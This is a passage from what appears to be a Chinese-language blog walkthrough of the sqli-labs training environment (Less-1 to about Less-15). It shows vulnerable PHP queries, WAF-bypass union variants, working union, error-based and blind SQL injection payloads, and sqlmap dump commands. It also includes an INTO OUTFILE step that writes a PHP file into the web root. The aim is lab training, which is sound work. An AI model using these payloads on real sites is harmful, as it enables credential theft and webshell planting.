class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">250</span>aunion<span class=\"operator\">%</span><span class=\"number\">250</span>aselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">09</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">09</span><span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>caunion<span class=\"operator\">%</span><span class=\"number\">0</span>cselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>daunion<span class=\"operator\">%</span><span class=\"number\">0</span>dselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>baunion<span class=\"operator\">%</span><span class=\"number\">0</span>bselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>d<span class=\"operator\">%</span><span class=\"number\">0</span>aunion<span class=\"operator\">%</span><span class=\"number\">0</span>d<span class=\"operator\">%</span><span class=\"number\">0</span>aselect <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"comment\">--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2</span></span><br><span class=\"line\"><span class=\"comment\">/*!12345union*/</span><span class=\"comment\">/*!12345select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"comment\">/*中文*/</span><span class=\"keyword\">union</span><span class=\"comment\">/*中文*/</span><span class=\"keyword\">select</span><span class=\"comment\">/*中文*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"comment\">/* */</span><span class=\"keyword\">union</span><span class=\"comment\">/* */</span><span class=\"keyword\">select</span><span class=\"operator\">/</span> <span class=\"operator\">*</span><span class=\"operator\">/</span><span class=\"number\">1</span>,<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"comment\">/*!union*/</span><span class=\"comment\">/*!00000all*/</span><span class=\"comment\">/*!00000select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"3-sqli-labs通关\"><a href=\"#3-sqli-labs通关\" class=\"headerlink\" title=\"3. sqli-labs通关\"></a>3. sqli-labs通关</h2><p>这里跟着<a href=\"https://www.sqlsec.com/2020/05/sqlilabs.html\">国光佬</a>学习</p>\n<h3 id=\"3-1-准备工作\"><a href=\"#3-1-准备工作\" class=\"headerlink\" title=\"3.1 准备工作\"></a>3.1 准备工作</h3><p><strong>sqli-labs环境搭建</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull acgpiano/sqli-labs</span><br><span class=\"line\">docker run -dt --name sqli-labs -p 8888:80 acgpiano/sqli-labs:latest</span><br></pre></td></tr></table></figure>\n\n<p>中间可能报错，只需要关闭代理就行。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Error response from daemon: Head <span class=\"string\">&quot;https://registry-1.docker.io/v2/acgpiano/sqli-labs/manifests/latest&quot;</span>: Get <span class=\"string\">&quot;https://auth.docker.io/token?account=squarehhh&amp;scope=repository%3Aacgpiano%2Fsqli-labs%3Apull&amp;service=registry.docker.io&quot;</span>: EOF</span><br></pre></td></tr></table></figure>\n\n<p>访问网页，环境搭建完毕。</p>\n<img src=\"/posts/31899/image-20250305014536324.png\" class=\"\" title=\"image-20250305014536324\">\n\n<h3 id=\"3-2-Less-1-20\"><a href=\"#3-2-Less-1-20\" class=\"headerlink\" title=\"3.2 Less 1-20\"></a>3.2 Less 1-20</h3><h4 id=\"3-2-1-Less-1\"><a href=\"#3-2-1-Less-1\" class=\"headerlink\" title=\"3.2.1 Less-1\"></a>3.2.1 Less-1</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=&#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"string\">&quot;查询结果&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());  </span><br></pre></td></tr></table></figure>\n\n<p><strong>联合注入</strong></p>\n<p>手工</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">&#x27; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23 # 查库</span></span><br><span class=\"line\"><span class=\"string\">?id=-1&#x27;</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,(<span class=\"keyword\">select</span> group_concat(table_name) <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span>&quot;security&quot;)<span class=\"operator\">%</span><span class=\"number\">23</span> # 查表</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;)%23 # 查字段</span></span><br><span class=\"line\"><span class=\"string\">?id=-1&#x27;</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,(<span class=\"keyword\">select</span> group_concat(username,password SEPARATOR <span class=\"number\">0x3c62723e</span>) <span class=\"keyword\">from</span> users)<span class=\"operator\">%</span><span class=\"number\">23</span> # <span class=\"number\">0x3c62723e</span><span class=\"operator\">=</span><span class=\"operator\">&lt;</span>br<span class=\"operator\">&gt;</span>，即按换行分割</span><br></pre></td></tr></table></figure>\n\n<p>sqlmap</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u <span class=\"string\">&quot;http://localhost:8888/Less-1/?id=1&quot;</span> --technique=U -v 3 -D security -T <span class=\"built_in\">users</span> --dump --batch</span><br></pre></td></tr></table></figure>\n\n<p><strong>报错注入</strong></p>\n<p>手工</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;and updatexml(1,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e),1)%23</span></span><br><span class=\"line\"><span class=\"string\">?id=1&#x27;</span><span class=\"keyword\">and</span> extractvalue(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> concat(username,password) <span class=\"keyword\">from</span> users limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">0x7e</span>))<span class=\"operator\">%</span><span class=\"number\">23</span></span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure>\n\n<p>sqlmap</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u <span class=\"string\">&quot;http://localhost:8888/Less-1/?id=1&quot;</span> --technique=E -v 3 -D security -T <span class=\"built_in\">users</span> --dump --batch</span><br></pre></td></tr></table></figure>\n\n<p><strong>布尔盲注</strong></p>\n<p>手工</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;and ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;67 %23 # 有回显</span></span><br><span class=\"line\"><span class=\"string\">?id=1&#x27;</span><span class=\"keyword\">and</span> ascii(substr((<span class=\"keyword\">select</span> concat(username,password) <span class=\"keyword\">from</span> users limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">&gt;</span><span class=\"number\">68</span> <span class=\"operator\">%</span><span class=\"number\">23</span> # 无回显</span><br></pre></td></tr></table></figure>\n\n<p>sqlmap</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u <span class=\"string\">&quot;http://localhost:8888/Less-1/?id=1&quot;</span> --technique=B -v 3 -D security -T <span class=\"built_in\">users</span> --dump --batch</span><br></pre></td></tr></table></figure>\n\n<p><strong>时间盲注</strong></p>\n<p>手工</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;68,1,sleep(5)) %23</span></span><br></pre></td></tr></table></figure>\n\n<p>sqlmap</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u <span class=\"string\">&quot;http://localhost:8888/Less-1/?id=1&quot;</span> --technique=T -v 3 -D security -T <span class=\"built_in\">users</span> --dump --batch</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-2-2-Less-2\"><a href=\"#3-2-2-Less-2\" class=\"headerlink\" title=\"3.2.2 Less-2\"></a>3.2.2 Less-2</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=<span class=\"subst\">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>闭合方式改变。</p>\n<h4 id=\"3-2-3-Less-3\"><a href=\"#3-2-3-Less-3\" class=\"headerlink\" title=\"3.2.3 Less-3\"></a>3.2.3 Less-3</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=(&#x27;<span class=\"subst\">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>闭合方式改变。</p>\n<h4 id=\"3-2-4-Less-4\"><a href=\"#3-2-4-Less-4\" class=\"headerlink\" title=\"3.2.4 Less-4\"></a>3.2.4 Less-4</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=(<span class=\"subst\">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>闭合方式改变。</p>\n<h4 id=\"3-2-5-Less-5\"><a href=\"#3-2-5-Less-5\" class=\"headerlink\" title=\"3.2.5 Less-5\"></a>3.2.5 Less-5</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=&#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You are in...........&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></table></figure>\n\n<p>不支持联合查询。</p>\n<h4 id=\"3-2-6-Less-6\"><a href=\"#3-2-6-Less-6\" class=\"headerlink\" title=\"3.2.6 Less-6\"></a>3.2.6 Less-6</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=<span class=\"subst\">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You are in...........&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></table></figure>\n\n<p>闭合方式不一样。</p>\n<h4 id=\"3-2-7-Less-7\"><a href=\"#3-2-7-Less-7\" class=\"headerlink\" title=\"3.2.7 Less-7\"></a>3.2.7 Less-7</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=((&#x27;<span class=\"subst\">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=<span class=\"subst\">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"comment\">//print_r(mysql_error());</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You have an error in your SQL syntax&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p><strong>布尔盲注</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;))and ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;67 %23 //正常回显</span></span><br><span class=\"line\"><span class=\"string\">?id=1&#x27;</span>))<span class=\"keyword\">and</span> ascii(substr((<span class=\"keyword\">select</span> concat(username,password) <span class=\"keyword\">from</span> users limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">&gt;</span><span class=\"number\">68</span> <span class=\"operator\">%</span><span class=\"number\">23</span> <span class=\"operator\">/</span><span class=\"operator\">/</span>报错</span><br></pre></td></tr></table></figure>\n\n<p><strong>时间盲注</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;))and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))&gt;67,1,sleep(5)) %23 //不延时</span></span><br><span class=\"line\"><span class=\"string\">?id=1&#x27;</span>))<span class=\"keyword\">and</span> if(ascii(substr((<span class=\"keyword\">select</span> concat(username,password) <span class=\"keyword\">from</span> users limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">&gt;</span><span class=\"number\">68</span>,<span class=\"number\">1</span>,sleep(<span class=\"number\">5</span>)) <span class=\"operator\">%</span><span class=\"number\">23</span> <span class=\"operator\">/</span><span class=\"operator\">/</span>延时</span><br></pre></td></tr></table></figure>\n\n<p><strong>outfile</strong></p>\n<p>这里因为提示<code>Use outfile</code>，因此可以尝试写文件。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ mysql -e <span class=\"string\">&quot;show global variables like &#x27;%secure%&#x27;;&quot;</span></span><br><span class=\"line\">+------------------+-------+</span><br><span class=\"line\">| Variable_name    | Value |</span><br><span class=\"line\">+------------------+-------+</span><br><span class=\"line\">| secure_auth      | OFF   |</span><br><span class=\"line\">| secure_file_priv |       |</span><br><span class=\"line\">+------------------+-------+</span><br></pre></td></tr></table></figure>\n\n<p>当<code>secure_file_priv</code>为<code>null</code>时，表示限制<code>mysql</code>不允许导入导出。</p>\n<p>当<code>secure_file_priv</code>为<code>/tmp</code>时，表示限制<code>mysql</code>只能在<code>/tmp</code>目录下导入导出。</p>\n<p>当<code>secure_file_priv</code>为<code>空</code>时，表示限制<code>mysql</code>不对导入导出做限制。</p>\n<p>这里还需要赋予文件写入的权限</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">chmod</span> -R 777 /var/www/html</span><br></pre></td></tr></table></figure>\n\n<p>然后执行sql语句</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;))union select * from security.users into outfile &quot;/var/www/html/Less-7/user.txt&quot;%23</span></span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/31899/image-20250310220651812.png\" class=\"\" title=\"image-20250310220651812\">\n\n<p>这里也可以写入shell</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;))union select 1,2,&quot;&lt;?php phpinfo();?&gt;&quot; into outfile &quot;/var/www/html/Less-7/info.php&quot;%23</span></span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/31899/image-20250310220934038.png\" class=\"\" title=\"image-20250310220934038\">\n\n<h4 id=\"3-2-8-Less-8\"><a href=\"#3-2-8-Less-8\" class=\"headerlink\" title=\"3.2.8 Less-8\"></a>3.2.8 Less-8</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=&#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You are in....&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"comment\">//print_r(mysql_error());</span></span><br><span class=\"line\">    <span class=\"comment\">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br></pre></td></tr></table></figure>\n\n<p>闭合方式改变。</p>\n<h4 id=\"3-2-9-Less-9\"><a href=\"#3-2-9-Less-9\" class=\"headerlink\" title=\"3.2.9 Less-9\"></a>3.2.9 Less-9</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=&#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=&#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You are in....&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You are in....&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>只能用延时注入。</p>\n<h4 id=\"3-2-10-Less-10\"><a href=\"#3-2-10-Less-10\" class=\"headerlink\" title=\"3.2.10 Less-10\"></a>3.2.10 Less-10</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=<span class=\"subst\">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You are in....&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You are in....&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>闭合方式改变。</p>\n<h4 id=\"3-2-11-Less-11\"><a href=\"#3-2-11-Less-11\" class=\"headerlink\" title=\"3.2.11 Less-11\"></a>3.2.11 Less-11</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;uname&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class=\"subst\">$uname</span>&#x27; and password=&#x27;<span class=\"subst\">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"string\">&quot;查询结果&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></table></figure>\n\n<p>与Less-1一致。</p>\n<h4 id=\"3-2-12-Less-12\"><a href=\"#3-2-12-Less-12\" class=\"headerlink\" title=\"3.2.12 Less-12\"></a>3.2.12 Less-12</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;uname&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT username, password FROM users WHERE username=(<span class=\"subst\">$uname</span>) and password=(<span class=\"subst\">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"string\">&quot;查询结果&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></table></figure>\n\n<p>闭合方式改变。</p>\n<h4 id=\"3-2-13-Less-13\"><a href=\"#3-2-13-Less-13\" class=\"headerlink\" title=\"3.2.13 Less-13\"></a>3.2.13 Less-13</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;uname&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class=\"subst\">$uname</span>&#x27;) and password=(&#x27;<span class=\"subst\">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"comment\">//&quot;查询结果&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());\t</span><br></pre></td></tr></table></figure>\n\n<p>闭合方式改变，不能用联合查询。</p>\n<h4 id=\"3-2-14-Less-14\"><a href=\"#3-2-14-Less-14\" class=\"headerlink\" title=\"3.2.14 Less-14\"></a>3.2.14 Less-14</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;uname&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT username, password FROM users WHERE username=<span class=\"subst\">$uname</span> and password=<span class=\"subst\">$passwd</span> LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"comment\">//&quot;查询结果&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></table></figure>\n\n<p>闭合方式改变。</p>\n<h4 id=\"3-2-15-Less-15\"><a href=\"#3-2-15-Less-15\" class=\"headerlink\" title=\"3.2.15 Less-15\"></a>3.2.15 Less-15</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 